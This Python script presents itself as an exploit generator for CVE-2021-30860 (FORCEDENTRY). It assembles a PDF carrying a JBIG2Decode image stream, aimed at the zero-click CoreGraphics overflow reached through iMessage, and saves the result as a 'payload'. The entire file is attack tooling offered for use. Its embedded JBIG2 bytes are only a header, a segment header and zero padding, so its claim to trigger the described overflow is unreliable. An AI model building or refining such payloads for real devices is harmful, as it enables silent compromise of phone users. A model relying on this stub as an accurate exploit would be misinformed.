#!/usr/bin/env python3
"""CVE-2021-30860 — FORCEDENTRY. Integer overflow in CoreGraphics JBIG2 decoder.
Zero-click via iMessage PDF. Carrier: PDF with a JBIG2Decode stream."""
import sys
from pathlib import Path

def build() -> bytes:
    jbig2 = bytes.fromhex("974A42320D0A1A0A01000000")            # JBIG2 file header
    seg   = bytes.fromhex("000000010000001C00000000000000")      # segment header
    stream = jbig2 + seg + (b"\x00" * 8)
    objs = [b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n",
            b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n",
            b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] "
            b"/Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >> endobj\n",
            b"4 0 obj << /Type /XObject /Subtype /Image /Width 8 /Height 8 "
            b"/ColorSpace /DeviceGray /BitsPerComponent 1 /Filter /JBIG2Decode "
            b"/Length " + str(len(stream)).encode() + b" >> stream\n" + stream + b"\nendstream endobj\n"]
    content = b"q 10 0 0 10 0 0 cm /Im0 Do Q"
    objs.append(b"5 0 obj << /Length " + str(len(content)).encode() + b" >> stream\n"
                + content + b"\nendstream endobj\n")
    out = bytearray(b"%PDF-1.4\n"); offsets = []
    for o in objs:
        offsets.append(len(out)); out += o
    xref = len(out)
    out += b"xref\n0 " + str(len(objs) + 1).encode() + b"\n0000000000 65535 f \n"
    for off in offsets:
        out += f"{off:010d} 00000 n \n".encode()
    out += (b"trailer << /Size " + str(len(objs) + 1).encode() + b" /Root 1 0 R >>\n"
            b"startxref\n" + str(xref).encode() + b"\n%%EOF")
    return bytes(out)

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2021-30860.pdf")
    data = build(); out.write_bytes(data)
    print(f"[+] CVE-2021-30860 PDF payload -> {out} ({len(data)} bytes)")

if __name__ == "__main__":
    main()
